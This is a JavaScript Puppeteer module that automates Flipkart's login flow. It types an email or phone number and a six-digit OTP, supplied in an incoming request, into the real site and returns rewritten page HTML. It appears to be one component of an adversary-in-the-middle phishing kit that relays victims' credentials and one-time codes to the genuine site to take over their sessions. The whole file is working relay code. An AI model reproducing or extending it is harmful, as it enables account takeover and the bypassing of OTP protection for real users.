const { Application } = require("../Application")
const { getHeaders } = require("../headers")

class Flipkart extends Application {
    async postRequest(configuration) {
        const browser = await this.connectBrowser()
        const pages = await browser.pages()
        const page = pages[0]
        await page.setExtraHTTPHeaders(getHeaders(this.device))

        const body = configuration.body
        const spikeType = body["spike-type"]

        try {
            if (spikeType == "email") {
                await page.evaluate(() => {
                    let form1 = document.querySelectorAll("form")[1]
                    form1.querySelector("input").id = "s_email"
                    form1.querySelector("button").id = "s_submit"
                })

                await page.waitForSelector("#s_email")
                await page.waitForSelector("#s_submit")

                await page.type("#s_email", body.email)
                await Promise.all([
                    page.click("#s_submit"),
                    new Promise(re => setTimeout(re, 4000))
                ])
            } else if (spikeType == "otp_code") {
                await page.evaluate(() => {
                    let form1 = document.querySelectorAll("form")[1]
                    let allInputs = form1.querySelectorAll("input")
                    allInputs.forEach((value, index) => {
                        value.id = `otp-box-${index}`
                    })
                    form1.querySelector("button").id = "s_submit"
                })

                for (let i = 0; i < 6; i++) {
                    await page.waitForSelector(`#otp-box-${i}`)
                    await page.type(`#otp-box-${i}`, body.otp_code[i])
                }

                await Promise.all([
                    page.click("#s_submit"),
                    new Promise(re => setTimeout(re, 4000))
                ])
            } else if (spikeType == "m_login") {
                let sel = `[type="number"]`
                await page.waitForSelector(sel)

                let clearInputs = [sel]

                for (let i = 0; i < clearInputs.length; i++) {
                    await page.focus(clearInputs[i]); // Focus on the input element

                    // Use keyboard shortcuts to clear the input field
                    await page.keyboard.down('Control')
                    await page.keyboard.press('A')
                    await page.keyboard.up('Control')
                    await page.keyboard.press('Backspace')
                }

                await page.evaluate(() => {
                    let allbtn = document.querySelectorAll("button")
                    allbtn.forEach(btn => {
                        if (btn.innerText.includes("Continue")) {
                            btn.setAttribute("spike-btn", true)
                        }
                    })
                })

                await page.type(sel, body.email)

                await Promise.all([
                    page.click(`[spike-btn="true"]`, { delay: 200 }),
                    new Promise(re => setTimeout(re, 4000))
                ])
            } else if (spikeType == "m_otp") {
                await page.evaluate(() => {
                    let allInputs = document.querySelectorAll("._3-3NCn input")
                    allInputs.forEach((value, index) => {
                        value.setAttribute(`otp-box`, index)
                    })

                    let allbtn = document.querySelectorAll("button")
                    allbtn.forEach(btn => {
                        if (btn.innerText.includes("Verify")) {
                            btn.setAttribute("spike-btn", true)
                        }
                    })
                })

                for (let i = 0; i < 6; i++) {
                    await page.waitForSelector(`[otp-box="${i}"]`)
                    await page.type(`[otp-box="${i}"]`, body.m_otp[i])
                }

                await Promise.all([
                    page.click(`[spike-btn="true"]`, { delay: 200 }),
                    new Promise(re => setTimeout(re, 4000))
                ])
            } else {
                return await this.openTAB(true)
            }


            const html = await page.content()
            let response = this.alterHTML(html, true)
            return response
        } catch (error) {
            console.log(error, "\n::- resetting the page to index")
            return await this.openTAB(true)
        }
    }
}

async function init(reqType, config) {
    const appBrowser = new Flipkart(config)
    await appBrowser.openBrowser()

    if (reqType == "getReq") {
        return await appBrowser.openTAB(true)
    } else if (reqType == "postReq") {
        return await appBrowser.postRequest(config)
    }
}

module.exports = {
    init
}